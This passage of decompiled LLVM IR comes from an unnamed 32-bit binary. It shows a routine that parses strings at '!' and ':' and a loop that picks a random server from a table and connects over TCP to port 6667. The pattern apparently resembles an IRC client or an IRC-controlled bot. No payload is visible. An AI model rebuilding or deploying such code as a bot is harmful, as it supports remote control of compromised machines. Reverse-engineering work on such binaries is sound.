  uselistorder i32 %v3_804a997, { 1, 0 }
  uselistorder i32 %v5_804a980, { 1, 2, 0, 3, 4 }
  uselistorder i8* %stack_var_-20.2, { 1, 0 }
  uselistorder i32 %stack_var_-28.2, { 2, 0, 1, 3 }
  uselistorder i32 %.pre, { 1, 0 }
  uselistorder i32 %storemerge11, { 1, 0, 2 }
  uselistorder i32 %storemerge1272, { 1, 0 }
  uselistorder i32 %v3_804a8bb, { 1, 0 }
  uselistorder i8* %stack_var_-20.0, { 1, 0 }
  uselistorder i32 %stack_var_-28.0, { 2, 0, 1, 3 }
  uselistorder i8** @global_var_80560e8.11, { 6, 0, 5, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32)* @function_80482b2, { 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 2, 1, 0, 8, 7, 6, 5, 4, 3 }
  uselistorder i64* @global_var_80560ec.12, { 6, 5, 0, 4, 3, 2, 1 }
  uselistorder i8* %arg2, { 1, 2, 3, 0, 4, 5 }
  uselistorder label %dec_label_pc_804aa97, { 5, 4, 1, 2, 3, 0 }
  uselistorder label %bb, { 1, 0 }
  uselistorder label %dec_label_pc_804a9bb, { 1, 0 }
  uselistorder label %dec_label_pc_804a958.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_804a980, { 1, 0 }
  uselistorder label %dec_label_pc_804a8df, { 1, 0 }
  uselistorder label %dec_label_pc_804a87c.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_804a8a4, { 1, 0 }
}

define i32 @function_804aa9e() local_unnamed_addr {
dec_label_pc_804aa9e:
  %v0_804aaa4 = load i32, i32* @global_var_80588a4.80, align 4
  %v1_804aaad = call i32 @function_804e725(i32 %v0_804aaa4)
  store i32 %v1_804aaad, i32* @eax, align 4
  %v0_804aab5 = call i32 @function_80484c9()
  store i32 %v0_804aab5, i32* @global_var_80588a4.80, align 4
  ret i32 %v0_804aab5
}

define i32 @function_804aac1(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804aac1:
  %tmp17 = inttoptr i32 %arg2 to i8*
  %v4_804aad7 = ptrtoint i8* %arg1 to i32
  br label %dec_label_pc_804aad4

dec_label_pc_804aad1:                             ; preds = %dec_label_pc_804aaf3
  %v4_804aad1 = add i32 %storemerge, 1
  br label %dec_label_pc_804aad4

dec_label_pc_804aad4:                             ; preds = %dec_label_pc_804aac1, %dec_label_pc_804aad1
  %storemerge = phi i32 [ %v4_804aad1, %dec_label_pc_804aad1 ], [ 0, %dec_label_pc_804aac1 ]
  store i1 false, i1* @df, align 1
  store i32 %v4_804aad7, i32* @edi, align 4
  %v3_804aae8 = call i32 @_strlen(i8* %arg1)
  %v7_804aaef = icmp ult i32 %storemerge, %v3_804aae8
  %v1_804aaf1 = icmp eq i1 %v7_804aaef, false
  %.pre = add i32 %storemerge, %v4_804aad7
  br i1 %v1_804aaf1, label %dec_label_pc_804aad4.dec_label_pc_804aaff_crit_edge, label %dec_label_pc_804aaf3

dec_label_pc_804aad4.dec_label_pc_804aaff_crit_edge: ; preds = %dec_label_pc_804aad4
  %.pre10 = inttoptr i32 %.pre to i8*
  br label %dec_label_pc_804aaff

dec_label_pc_804aaf3:                             ; preds = %dec_label_pc_804aad4
  %v1_804aaf9 = inttoptr i32 %.pre to i8*
  %v2_804aaf9 = load i8, i8* %v1_804aaf9, align 1
  %v10_804aafb = icmp eq i8 %v2_804aaf9, 33
  %v1_804aafd = icmp eq i1 %v10_804aafb, false
  br i1 %v1_804aafd, label %dec_label_pc_804aad1, label %dec_label_pc_804aaff

dec_label_pc_804aaff:                             ; preds = %dec_label_pc_804aaf3, %dec_label_pc_804aad4.dec_label_pc_804aaff_crit_edge
  %v1_804ab05.pre-phi = phi i8* [ %.pre10, %dec_label_pc_804aad4.dec_label_pc_804aaff_crit_edge ], [ %v1_804aaf9, %dec_label_pc_804aaf3 ]
  store i8 0, i8* %v1_804ab05.pre-phi, align 1
  %v0_804ab08 = load i32, i32* @global_var_80588a4.80, align 4
  %v3_804ab14 = call i32 @function_804d2f4(i8* %arg1, i32 %v0_804ab08)
  %v1_804ab1c = icmp eq i32 %v3_804ab14, 0
  %v1_804ab1e = icmp eq i1 %v1_804ab1c, false
  br i1 %v1_804ab1e, label %dec_label_pc_804ab59, label %dec_label_pc_804ab20

dec_label_pc_804ab20:                             ; preds = %dec_label_pc_804aaff
  %v2_804ab23 = load i8, i8* %tmp17, align 1
  %v10_804ab25 = icmp eq i8 %v2_804ab23, 58
  %v1_804ab27 = icmp eq i1 %v10_804ab25, false
  br i1 %v1_804ab27, label %dec_label_pc_804ab2c, label %dec_label_pc_804ab29

dec_label_pc_804ab29:                             ; preds = %dec_label_pc_804ab20
  %v5_804ab29 = add i32 %arg2, 1
  %v22_804ab29 = inttoptr i32 %v5_804ab29 to i8*
  br label %dec_label_pc_804ab2c

dec_label_pc_804ab2c:                             ; preds = %dec_label_pc_804ab20, %dec_label_pc_804ab29
  %stack_var_12.0 = phi i8* [ %tmp17, %dec_label_pc_804ab20 ], [ %v22_804ab29, %dec_label_pc_804ab29 ]
  %v0_804ab2c = load i32, i32* @global_var_80588a4.80, align 4
  %v1_804ab31 = icmp eq i32 %v0_804ab2c, 0
  br i1 %v1_804ab31, label %dec_label_pc_804ab2c.dec_label_pc_804ab46_crit_edge, label %dec_label_pc_804ab35

dec_label_pc_804ab2c.dec_label_pc_804ab46_crit_edge: ; preds = %dec_label_pc_804ab2c
  br label %dec_label_pc_804ab46

dec_label_pc_804ab35:                             ; preds = %dec_label_pc_804ab2c
  %v1_804ab3e = call i32 @function_804e725(i32 %v0_804ab2c)
  br label %dec_label_pc_804ab46

dec_label_pc_804ab46:                             ; preds = %dec_label_pc_804ab2c.dec_label_pc_804ab46_crit_edge, %dec_label_pc_804ab35
  %v4_804ab49 = ptrtoint i8* %stack_var_12.0 to i32
  %v1_804ab4c = call i32 @function_804d32c(i32 %v4_804ab49)
  store i32 %v1_804ab4c, i32* @global_var_80588a4.80, align 4
  br label %dec_label_pc_804ab59

dec_label_pc_804ab59:                             ; preds = %dec_label_pc_804aaff, %dec_label_pc_804ab46
  %v0_804ab5d = phi i32 [ %v3_804ab14, %dec_label_pc_804aaff ], [ %v1_804ab4c, %dec_label_pc_804ab46 ]
  ret i32 %v0_804ab5d

; uselistorder directives
  uselistorder i32 %.pre, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i8* %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804ab59, { 1, 0 }
  uselistorder label %dec_label_pc_804ab46, { 1, 0 }
  uselistorder label %dec_label_pc_804ab2c, { 1, 0 }
  uselistorder label %dec_label_pc_804aad4, { 1, 0 }
}

define i32 @function_804ab5e() local_unnamed_addr {
dec_label_pc_804ab5e:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp20 = call i32 @__decompiler_undefined_function_0()
  %stack_var_0 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804ab5e = load i32, i32* @ebp, align 4
  store i32 %v0_804ab5e, i32* %stack_var_-4, align 4
  %v4_804ab5e = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_804ab5e, i32* @ebp, align 4
  %v15_804ab61 = ptrtoint i32* %stack_var_-44 to i32
  %v2_804ac39 = ptrtoint i32* %stack_var_-32 to i32
  %v2_804ac3c = ptrtoint i32* %stack_var_-28 to i32
  %v2_804ac8e = ptrtoint i32* %stack_var_-36 to i32
  br label %dec_label_pc_804ab66

dec_label_pc_804ab66:                             ; preds = %dec_label_pc_804ab66.backedge, %dec_label_pc_804ab5e
  %v0_804abad.pre14 = phi i32 [ %v15_804ab61, %dec_label_pc_804ab5e ], [ %storemerge16.in, %dec_label_pc_804ab66.backedge ]
  %stack_var_-8.0 = phi i32 [ %tmp20, %dec_label_pc_804ab5e ], [ %stack_var_-8.0.be, %dec_label_pc_804ab66.backedge ]
  store i32 -1, i32* @global_var_80588a8.7, align 8
  store i32 1, i32* %stack_var_-36, align 4
  %v0_804ab77 = load i32, i32* @global_var_80560e0.60, align 32
  store i32 %v0_804ab77, i32* @eax, align 4
  %v1_804ab7c = icmp eq i32 %v0_804ab77, 0
  %v1_804ab7e = icmp eq i1 %v1_804ab7c, false
  br i1 %v1_804ab7e, label %dec_label_pc_804aba3, label %dec_label_pc_804ab80

dec_label_pc_804ab80:                             ; preds = %dec_label_pc_804ab66
  %v1_804ab80 = call i32 @function_804e9f8(i32 1)
  %v0_804ab87 = load i64, i64* @global_var_8055d40.99, align 8
  %v2_804ab90 = ashr i32 %v1_804ab80, 31
  %v2_804ab93 = zext i32 %v1_804ab80 to i64
  %v4_804ab93 = zext i32 %v2_804ab90 to i64
  %v5_804ab93 = mul nuw i64 %v4_804ab93, 4294967296
  %v6_804ab93 = or i64 %v5_804ab93, %v2_804ab93
  %v7_804ab93 = and i64 %v0_804ab87, 4294967295
  %v10_804ab93 = srem i64 %v6_804ab93, %v7_804ab93
  %v11_804ab93 = trunc i64 %v10_804ab93 to i32
  store i32 %v11_804ab93, i32* %edx.global-to-local, align 4
  store i32 %v11_804ab93, i32* %eax.global-to-local, align 4
  %v1_804ab97 = mul i32 %v11_804ab93, 4
  %v2_804ab97 = add i32 %v1_804ab97, ptrtoint ([16 x i8]** @global_var_8055d44.101 to i32)
  %v3_804ab97 = inttoptr i32 %v2_804ab97 to i32*
  %v4_804ab97 = load i32, i32* %v3_804ab97, align 4
  store i32 %v4_804ab97, i32* %eax.global-to-local, align 4
  store i32 %v4_804ab97, i32* @global_var_80589c0.59, align 64
  %v0_804abad.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804aba3

dec_label_pc_804aba3:                             ; preds = %dec_label_pc_804ab66, %dec_label_pc_804ab80
  %v0_804abad.pre = phi i32 [ %v0_804abad.pre14, %dec_label_pc_804ab66 ], [ %v0_804abad.pre.pre, %dec_label_pc_804ab80 ]
  store i32 0, i32* @global_var_80560e0.60, align 32
  br label %dec_label_pc_804abad

dec_label_pc_804abad:                             ; preds = %dec_label_pc_804abad, %dec_label_pc_804aba3
  %v0_804abad = phi i32 [ %v1_804abbb, %dec_label_pc_804abad ], [ %v0_804abad.pre, %dec_label_pc_804aba3 ]
  %v1_804abb0 = add i32 %v0_804abad, -8
  %v2_804abb0 = inttoptr i32 %v1_804abb0 to i32*
  store i32 6, i32* %v2_804abb0, align 4
  %v1_804abb2 = add i32 %v0_804abad, -12
  %v2_804abb2 = inttoptr i32 %v1_804abb2 to i32*
  store i32 1, i32* %v2_804abb2, align 4
  %v1_804abb4 = add i32 %v0_804abad, -16
  %v2_804abb4 = inttoptr i32 %v1_804abb4 to i32*
  store i32 2, i32* %v2_804abb4, align 4
  %v0_804abb6 = load i32, i32* %stack_var_-36, align 4
  %v1_804abb6 = load i32, i32* %stack_var_-32, align 4
  %v2_804abb6 = load i32, i32* %stack_var_-28, align 4
  %v3_804abb6 = call i32 @function_804da00(i32 %v0_804abb6, i32 %v1_804abb6, i32 %v2_804abb6)
  %v0_804abbb = load i32, i32* @esp, align 4
  %v1_804abbb = add i32 %v0_804abbb, 16
  store i32 %v3_804abb6, i32* @global_var_80588a8.7, align 8
  store i32 %v3_804abb6, i32* %eax.global-to-local, align 4
  %v2_804abc8 = icmp slt i32 %v3_804abb6, 0
  br i1 %v2_804abc8, label %dec_label_pc_804abad, label %dec_label_pc_804abcc

dec_label_pc_804abcc:                             ; preds = %dec_label_pc_804abad
  %v0_804abcc = load i32, i32* @global_var_80589c0.59, align 64
  store i32 %v0_804abcc, i32* %eax.global-to-local, align 4
  %v3_804abd4 = inttoptr i32 %v0_804abbb to i32*
  store i32 %v0_804abcc, i32* %v3_804abd4, align 4
  %v0_804abd5 = load i32, i32* %stack_var_-36, align 4
  %v1_804abd5 = call i32 @function_804d518(i32 %v0_804abd5)
  store i32 %v1_804abd5, i32* %eax.global-to-local, align 4
  %v0_804abda = load i32, i32* @esp, align 4
  %v1_804abdd = icmp eq i32 %v1_804abd5, 0
  br i1 %v1_804abdd, label %dec_label_pc_804abf7, label %dec_label_pc_804abe1

dec_label_pc_804abe1:                             ; preds = %dec_label_pc_804abcc
  %v0_804abe1 = load i32, i32* @global_var_80589c0.59, align 64
  store i32 %v0_804abe1, i32* %eax.global-to-local, align 4
  %v3_804abe9 = inttoptr i32 %v0_804abda to i32*
  store i32 %v0_804abe1, i32* %v3_804abe9, align 4
  %v0_804abea = load i32, i32* %stack_var_-36, align 4
  %v1_804abea = call i32 @function_804d518(i32 %v0_804abea)
  store i32 %v1_804abea, i32* %eax.global-to-local, align 4
  %v0_804abef = load i32, i32* @esp, align 4
  %v10_804abf2 = icmp eq i32 %v1_804abea, -1
  %v1_804abf5 = icmp eq i1 %v10_804abf2, false
  br i1 %v1_804abf5, label %dec_label_pc_804ac57, label %dec_label_pc_804abf7

dec_label_pc_804abf7:                             ; preds = %dec_label_pc_804abe1, %dec_label_pc_804abcc
  %v0_804abfc.in = phi i32 [ %v0_804abef, %dec_label_pc_804abe1 ], [ %v0_804abda, %dec_label_pc_804abcc ]
  %v0_804abf7 = load i32, i32* @global_var_80589c0.59, align 64
  store i32 %v0_804abf7, i32* %eax.global-to-local, align 4
  %v3_804abff = inttoptr i32 %v0_804abfc.in to i32*
  store i32 %v0_804abf7, i32* %v3_804abff, align 4
  %v0_804ac00 = load i32, i32* %stack_var_-36, align 4
  %v1_804ac00 = call i32 @function_804d540(i32 %v0_804ac00)
  store i32 %v1_804ac00, i32* %eax.global-to-local, align 4
  %v0_804ac05 = load i32, i32* @esp, align 4
  %v4_804ac0b = icmp eq i32 %v1_804ac00, 0
  %v1_804ac0f = icmp eq i1 %v4_804ac0b, false
  br i1 %v1_804ac0f, label %dec_label_pc_804ac31, label %dec_label_pc_804ac11

dec_label_pc_804ac11:                             ; preds = %dec_label_pc_804abf7
  store i32 0, i32* @global_var_80589c0.59, align 64
  %v0_804ac1b = load i32, i32* @global_var_80588a8.7, align 8
  store i32 %v0_804ac1b, i32* %eax.global-to-local, align 4
  %v3_804ac23 = inttoptr i32 %v0_804ac05 to i32*
  store i32 %v0_804ac1b, i32* %v3_804ac23, align 4
  %v1_804ac24 = call i32 @function_804b4a4(i32 %v1_804ac00)
  br label %dec_label_pc_804ab66.backedge

dec_label_pc_804ab66.backedge:                    ; preds = %dec_label_pc_804ac11, %dec_label_pc_804ad73
  %storemerge = phi i32 [ %v1_804ac24, %dec_label_pc_804ac11 ], [ %v1_804ad86, %dec_label_pc_804ad73 ]
  %stack_var_-8.0.be = phi i32 [ %v1_804ac00, %dec_label_pc_804ac11 ], [ %stack_var_-8.1, %dec_label_pc_804ad73 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %storemerge18.in = load i32, i32* @esp, align 4
  %storemerge16.in = add i32 %storemerge18.in, 16
  br label %dec_label_pc_804ab66

dec_label_pc_804ac31:                             ; preds = %dec_label_pc_804abf7
  store i32 %v1_804ac00, i32* %eax.global-to-local, align 4
  %v1_804ac34 = add i32 %v1_804ac00, 12
  %v2_804ac34 = inttoptr i32 %v1_804ac34 to i32*
  %v3_804ac34 = load i32, i32* %v2_804ac34, align 4
  store i32 %v3_804ac34, i32* %edx.global-to-local, align 4
  store i32 %v1_804ac00, i32* %eax.global-to-local, align 4
  %v1_804ac42 = add i32 %v1_804ac00, 16
  %v2_804ac42 = inttoptr i32 %v1_804ac42 to i32*
  %v3_804ac42 = load i32, i32* %v2_804ac42, align 4
  store i32 %v3_804ac42, i32* %eax.global-to-local, align 4
  %v1_804ac45 = inttoptr i32 %v3_804ac42 to i32*
  %v2_804ac45 = load i32, i32* %v1_804ac45, align 4
  store i32 %v2_804ac45, i32* %eax.global-to-local, align 4
  %v2_804ac4a = add i32 %v0_804ac05, 8
  %v3_804ac4a = inttoptr i32 %v2_804ac4a to i32*
  store i32 %v3_804ac34, i32* %v3_804ac4a, align 4
  %v2_804ac4b = add i32 %v0_804ac05, 4
  %v3_804ac4b = inttoptr i32 %v2_804ac4b to i32*
  store i32 %v2_804ac3c, i32* %v3_804ac4b, align 4
  %v0_804ac4c = load i32, i32* %eax.global-to-local, align 4
  %v3_804ac4c = inttoptr i32 %v0_804ac05 to i32*
  store i32 %v0_804ac4c, i32* %v3_804ac4c, align 4
  %v1_804ac4d = load i32, i32* %stack_var_-4, align 4
  %v2_804ac4d = load i32, i32* %stack_var_0, align 4
  %v3_804ac4d = call i32 @function_804d2dc(i32 %v1_804ac00, i32 %v1_804ac4d, i32 %v2_804ac4d)
  store i32 %v3_804ac4d, i32* %eax.global-to-local, align 4
  %v0_804ac52 = load i32, i32* @esp, align 4
  br label %dec_label_pc_804ac6b

dec_label_pc_804ac57:                             ; preds = %dec_label_pc_804abe1
  %v0_804ac57 = load i32, i32* @global_var_80589c0.59, align 64
  store i32 %v0_804ac57, i32* %eax.global-to-local, align 4
  %v3_804ac5f = inttoptr i32 %v0_804abef to i32*
  store i32 %v0_804ac57, i32* %v3_804ac5f, align 4
  %v1_804ac60 = call i32 @function_804d518(i32 %stack_var_-8.0)
  store i32 %v1_804ac60, i32* %eax.global-to-local, align 4
  %v0_804ac65 = load i32, i32* @esp, align 4
  store i32 %v1_804ac60, i32* %stack_var_-28, align 4
  br label %dec_label_pc_804ac6b

dec_label_pc_804ac6b:                             ; preds = %dec_label_pc_804ac31, %dec_label_pc_804ac57
  %v0_804ac71.in = phi i32 [ %v0_804ac52, %dec_label_pc_804ac31 ], [ %v0_804ac65, %dec_label_pc_804ac57 ]
  %stack_var_-8.1 = phi i32 [ %v1_804ac00, %dec_label_pc_804ac31 ], [ %stack_var_-8.0, %dec_label_pc_804ac57 ]
  store i32 2, i32* %stack_var_-32, align 4
  %v2_804ac74 = inttoptr i32 %v0_804ac71.in to i32*
  store i32 6667, i32* %v2_804ac74, align 4
  %v0_804ac79 = load i32, i32* %stack_var_-32, align 4
  %v1_804ac79 = call i32 @function_804d410(i32 %v0_804ac79)
  %v0_804ac7e = load i32, i32* @esp, align 4
  %v0_804ac85 = load i32, i32* @global_var_80588a8.7, align 8
  store i32 %v0_804ac85, i32* %edx.global-to-local, align 4
  store i32 %v2_804ac8e, i32* %eax.global-to-local, align 4
  %v2_804ac91 = add i32 %v0_804ac7e, 8
  %v3_804ac91 = inttoptr i32 %v2_804ac91 to i32*
  store i32 %v2_804ac8e, i32* %v3_804ac91, align 4
  %v1_804ac92 = add i32 %v0_804ac7e, 4
  %v2_804ac92 = inttoptr i32 %v1_804ac92 to i32*
  store i32 21537, i32* %v2_804ac92, align 4
  %v0_804ac97 = load i32, i32* %edx.global-to-local, align 4
  %v3_804ac97 = inttoptr i32 %v0_804ac7e to i32*
  store i32 %v0_804ac97, i32* %v3_804ac97, align 4
  %sext = mul i32 %v1_804ac79, 65536
  %v1_804ac98 = sdiv i32 %sext, 65536
  %v4_804ac98 = call i32 @function_804b61c(i32 %v1_804ac98, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804ac98, i32* %eax.global-to-local, align 4
  %v0_804ac9d = load i32, i32* @esp, align 4
  %v2_804aca3 = inttoptr i32 %v0_804ac9d to i32*
  store i32 0, i32* %v2_804aca3, align 4
  %v2_804aca5 = inttoptr i32 %v1_804ac98 to i32*
  %v3_804aca5 = call i32 @function_804b6d0(i32* %v2_804aca5)
  store i32 %v3_804aca5, i32* %eax.global-to-local, align 4
  %v1_804ad5f = inttoptr i32 %v3_804aca5 to i32*
  br label %dec_label_pc_804ad5a

dec_label_pc_804acb5:                             ; preds = %dec_label_pc_804ad5a
  %v1_804acb5 = call i32 @function_804b774(i32 %v3_804aca5)
  %v1_804acba = inttoptr i32 %v1_804acb5 to i32*
  store i32 0, i32* %v1_804acba, align 4
  store i32 %v2_804ac39, i32* %eax.global-to-local, align 4
  %v0_804acc3 = load i32, i32* @global_var_80588a8.7, align 8
  store i32 %v0_804acc3, i32* %edx.global-to-local, align 4
  %v0_804acc9 = load i32, i32* @esp, align 4
  %v1_804accc = add i32 %v0_804acc9, -8
  %v2_804accc = inttoptr i32 %v1_804accc to i32*
  store i32 16, i32* %v2_804accc, align 4
  %v2_804acce = add i32 %v0_804acc9, -12
  %v3_804acce = inttoptr i32 %v2_804acce to i32*
  store i32 %v2_804ac39, i32* %v3_804acce, align 4
  %v0_804accf = load i32, i32* %edx.global-to-local, align 4
  %v2_804accf = add i32 %v0_804acc9, -16
  %v3_804accf = inttoptr i32 %v2_804accf to i32*
  store i32 %v0_804accf, i32* %v3_804accf, align 4
  %v2_804acd0 = load i32, i32* %stack_var_-4, align 4
  %v3_804acd0 = call i32 @function_804d8fc(i32 %v3_804aca5, i32 %stack_var_-8.1, i32 %v2_804acd0)
  store i32 %v3_804acd0, i32* %eax.global-to-local, align 4
  %v0_804acd5 = load i32, i32* @esp, align 4
  %v1_804acd5 = add i32 %v0_804acd5, 16
  %v1_804acd8 = icmp eq i32 %v3_804acd0, 0
  br i1 %v1_804acd8, label %dec_label_pc_804ace8, label %dec_label_pc_804acdc

dec_label_pc_804acdc:                             ; preds = %dec_label_pc_804acb5
  %v1_804acdc = call i32 @function_804b774(i32 %v3_804aca5)
  store i32 %v1_804acdc, i32* %eax.global-to-local, align 4
  %v1_804ace1 = inttoptr i32 %v1_804acdc to i32*
  %v2_804ace1 = load i32, i32* %v1_804ace1, align 4
  store i32 %v2_804ace1, i32* %eax.global-to-local, align 4
  %v9_804ace3 = icmp eq i32 %v2_804ace1, 106
  %v1_804ace6 = icmp eq i1 %v9_804ace3, false
  br i1 %v1_804ace6, label %dec_label_pc_804ad35, label %dec_label_pc_804acdc.dec_label_pc_804ace8_crit_edge

dec_label_pc_804acdc.dec_label_pc_804ace8_crit_edge: ; preds = %dec_label_pc_804acdc
  %v0_804aced.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804ace8

dec_label_pc_804ace8:                             ; preds = %dec_label_pc_804acb5, %dec_label_pc_804acdc.dec_label_pc_804ace8_crit_edge
  %v0_804aced = phi i32 [ %v0_804aced.pre, %dec_label_pc_804acdc.dec_label_pc_804ace8_crit_edge ], [ %v1_804acd5, %dec_label_pc_804acb5 ]
  %v0_804ace8 = load i32, i32* @global_var_80588a8.7, align 8
  store i32 %v0_804ace8, i32* %eax.global-to-local, align 4
  %v1_804acf0 = add i32 %v0_804aced, -16
  %v2_804acf0 = inttoptr i32 %v1_804acf0 to i32*
  store i32 0, i32* %v2_804acf0, align 4
  %v1_804acf2 = add i32 %v0_804aced, -20
  %v2_804acf2 = inttoptr i32 %v1_804acf2 to i32*
  store i32 0, i32* %v2_804acf2, align 4
  %v1_804acf4 = add i32 %v0_804aced, -24
  %v2_804acf4 = inttoptr i32 %v1_804acf4 to i32*
  store i32 13, i32* %v2_804acf4, align 4
  %v1_804acf6 = add i32 %v0_804aced, -28
  %v2_804acf6 = inttoptr i32 %v1_804acf6 to i32*
  store i32 1, i32* %v2_804acf6, align 4
  %v0_804acf8 = load i32, i32* %eax.global-to-local, align 4
  %v2_804acf8 = add i32 %v0_804aced, -32
  %v3_804acf8 = inttoptr i32 %v2_804acf8 to i32*
  store i32 %v0_804acf8, i32* %v3_804acf8, align 4
  %v0_804acf9 = call i32 @function_804d9c4()
  %v0_804acfe = load i32, i32* @esp, align 4
  %v0_804ad01 = load i32, i32* @global_var_80588a8.7, align 8
  store i32 %v0_804ad01, i32* %eax.global-to-local, align 4
  %v1_804ad09 = add i32 %v0_804acfe, 16
  %v2_804ad09 = inttoptr i32 %v1_804ad09 to i32*
  store i32 0, i32* %v2_804ad09, align 4
  %v1_804ad0b = add i32 %v0_804acfe, 12
  %v2_804ad0b = inttoptr i32 %v1_804ad0b to i32*
  store i32 0, i32* %v2_804ad0b, align 4
  %v1_804ad0d = add i32 %v0_804acfe, 8
  %v2_804ad0d = inttoptr i32 %v1_804ad0d to i32*
  store i32 2, i32* %v2_804ad0d, align 4
  %v1_804ad0f = add i32 %v0_804acfe, 4
  %v2_804ad0f = inttoptr i32 %v1_804ad0f to i32*
  store i32 1, i32* %v2_804ad0f, align 4
  %v0_804ad11 = load i32, i32* %eax.global-to-local, align 4
  %v3_804ad11 = inttoptr i32 %v0_804acfe to i32*
  store i32 %v0_804ad11, i32* %v3_804ad11, align 4
  %v0_804ad12 = call i32 @function_804d9c4()
  %v0_804ad17 = load i32, i32* @esp, align 4
  %v0_804ad1a = load i32, i32* @global_var_80588a8.7, align 8
  store i32 %v0_804ad1a, i32* %eax.global-to-local, align 4
  %v1_804ad22 = add i32 %v0_804ad17, 16
  %v2_804ad22 = inttoptr i32 %v1_804ad22 to i32*
  store i32 0, i32* %v2_804ad22, align 4
  %v1_804ad24 = add i32 %v0_804ad17, 12
  %v2_804ad24 = inttoptr i32 %v1_804ad24 to i32*
  store i32 0, i32* %v2_804ad24, align 4
  %v1_804ad26 = add i32 %v0_804ad17, 8
  %v2_804ad26 = inttoptr i32 %v1_804ad26 to i32*
  store i32 9, i32* %v2_804ad26, align 4
  %v1_804ad28 = add i32 %v0_804ad17, 4
  %v2_804ad28 = inttoptr i32 %v1_804ad28 to i32*
  store i32 1, i32* %v2_804ad28, align 4
  %v0_804ad2a = load i32, i32* %eax.global-to-local, align 4
  %v3_804ad2a = inttoptr i32 %v0_804ad17 to i32*
  store i32 %v0_804ad2a, i32* %v3_804ad2a, align 4
  %v0_804ad2b = call i32 @function_804d9c4()
  store i32 %v0_804ad2b, i32* %eax.global-to-local, align 4
  ret i32 %v0_804ad2b

dec_label_pc_804ad35:                             ; preds = %dec_label_pc_804acdc
  %v1_804ad35 = call i32 @function_804b774(i32 %v3_804aca5)
  store i32 %v1_804ad35, i32* %eax.global-to-local, align 4
  %v1_804ad3a = inttoptr i32 %v1_804ad35 to i32*
  %v2_804ad3a = load i32, i32* %v1_804ad3a, align 4
  store i32 %v2_804ad3a, i32* %eax.global-to-local, align 4
  %v9_804ad3c = icmp eq i32 %v2_804ad3a, 115
  br i1 %v9_804ad3c, label %dec_label_pc_804ad4d, label %dec_label_pc_804ad41

dec_label_pc_804ad41:                             ; preds = %dec_label_pc_804ad35
  %v1_804ad41 = call i32 @function_804b774(i32 %v3_804aca5)
  store i32 %v1_804ad41, i32* %eax.global-to-local, align 4
  %v1_804ad46 = inttoptr i32 %v1_804ad41 to i32*
  %v2_804ad46 = load i32, i32* %v1_804ad46, align 4
  store i32 %v2_804ad46, i32* %eax.global-to-local, align 4
  %v9_804ad48 = icmp eq i32 %v2_804ad46, 114
  %v1_804ad4b = icmp eq i1 %v9_804ad48, false
  br i1 %v1_804ad4b, label %dec_label_pc_804ad41.dec_label_pc_804ad73_crit_edge, label %dec_label_pc_804ad4d

dec_label_pc_804ad41.dec_label_pc_804ad73_crit_edge: ; preds = %dec_label_pc_804ad41
  %v0_804ad82.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804ad73

dec_label_pc_804ad4d:                             ; preds = %dec_label_pc_804ad41, %dec_label_pc_804ad35
  %v0_804ad4d = load i32, i32* @esp, align 4
  %v1_804ad50 = add i32 %v0_804ad4d, -16
  %v2_804ad50 = inttoptr i32 %v1_804ad50 to i32*
  store i32 1, i32* %v2_804ad50, align 4
  %v1_804ad52 = call i32 @function_804ef98(i32 %v3_804aca5)
  store i32 %v1_804ad52, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ad5a

dec_label_pc_804ad5a:                             ; preds = %dec_label_pc_804ac6b, %dec_label_pc_804ad4d
  %storemerge4.in.in = load i32, i32* @esp, align 4
  %v2_804ad5d = inttoptr i32 %storemerge4.in.in to i32*
  store i32 0, i32* %v2_804ad5d, align 4
  %v2_804ad5f = call i32 @function_804b6d0(i32* %v1_804ad5f)
  %v0_804ad64 = load i32, i32* @esp, align 4
  %v1_804ad64 = add i32 %v0_804ad64, 16
  %v5_804ad67 = sub i32 %v2_804ad5f, %v3_804aca5
  store i32 %v5_804ad67, i32* %eax.global-to-local, align 4
  %tmp38 = icmp ult i32 %v5_804ad67, 10
  br i1 %tmp38, label %dec_label_pc_804acb5, label %dec_label_pc_804ad73

dec_label_pc_804ad73:                             ; preds = %dec_label_pc_804ad5a, %dec_label_pc_804ad41.dec_label_pc_804ad73_crit_edge
  %v0_804ad82 = phi i32 [ %v0_804ad82.pre, %dec_label_pc_804ad41.dec_label_pc_804ad73_crit_edge ], [ %v1_804ad64, %dec_label_pc_804ad5a ]
  store i32 0, i32* @global_var_80589c0.59, align 64
  %v0_804ad7d = load i32, i32* @global_var_80588a8.7, align 8
  store i32 %v0_804ad7d, i32* %eax.global-to-local, align 4
  %v2_804ad85 = add i32 %v0_804ad82, -16
  %v3_804ad85 = inttoptr i32 %v2_804ad85 to i32*
  store i32 %v0_804ad7d, i32* %v3_804ad85, align 4
  %v1_804ad86 = call i32 @function_804b4a4(i32 %v3_804aca5)
  br label %dec_label_pc_804ab66.backedge

; uselistorder directives
  uselistorder i32 %v0_804aced, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v3_804aca5, { 0, 7, 2, 1, 3, 4, 5, 6, 8, 9 }
  uselistorder i32 %v1_804ac98, { 1, 0 }
  uselistorder i32 %stack_var_-8.1, { 1, 0 }
  uselistorder i32 %v0_804ac05, { 2, 0, 1, 3 }
  uselistorder i32 %v1_804ac00, { 2, 3, 5, 4, 7, 6, 0, 1, 8, 9 }
  uselistorder i32 %v0_804abef, { 1, 0 }
